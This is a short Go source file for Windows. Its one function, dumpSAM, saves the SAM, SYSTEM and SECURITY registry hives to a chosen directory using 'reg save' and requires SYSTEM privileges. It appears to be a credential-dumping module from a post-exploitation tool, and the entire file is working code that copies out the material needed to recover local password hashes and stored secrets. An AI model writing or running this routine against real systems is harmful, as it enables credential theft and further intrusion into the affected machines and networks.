//go:build windows

package main

import (
	"fmt"
	"os/exec"
)

// dumpSAM saves HKLM\SAM, HKLM\SYSTEM, and HKLM\SECURITY hives to outDir.
// Requires SYSTEM privileges (SeBackupPrivilege).
func dumpSAM(outDir string) (string, error) {
	hives := []struct {
		key  string
		file string
	}{
		{`HKLM\SAM`, outDir + `\sam.save`},
		{`HKLM\SYSTEM`, outDir + `\system.save`},
		{`HKLM\SECURITY`, outDir + `\security.save`},
	}

	var results []string
	for _, h := range hives {
		out, err := exec.Command("reg", "save", h.key, h.file, "/y").CombinedOutput()
		if err != nil {
			results = append(results, fmt.Sprintf("reg save %s: %v — %s", h.key, err, string(out)))
		} else {
			results = append(results, fmt.Sprintf("saved %s → %s", h.key, h.file))
		}
	}

	combined := ""
	for _, r := range results {
		combined += r + "\n"
	}
	return combined, nil
}
